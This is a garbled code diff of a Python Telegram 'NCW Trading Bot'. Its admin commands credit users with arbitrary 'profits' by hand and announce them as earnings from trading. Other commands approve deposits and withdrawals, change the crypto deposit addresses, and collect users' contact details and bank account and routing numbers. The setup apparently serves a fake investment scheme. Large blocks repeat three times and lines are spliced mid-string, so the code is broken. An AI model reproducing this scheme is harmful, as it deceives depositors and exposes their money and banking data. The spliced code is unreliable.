+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
             ],
             WITHDRAW_BANK_NAME: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_bank_name),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
             ],
             WITHDRAW_ACCOUNT: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_account_number),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
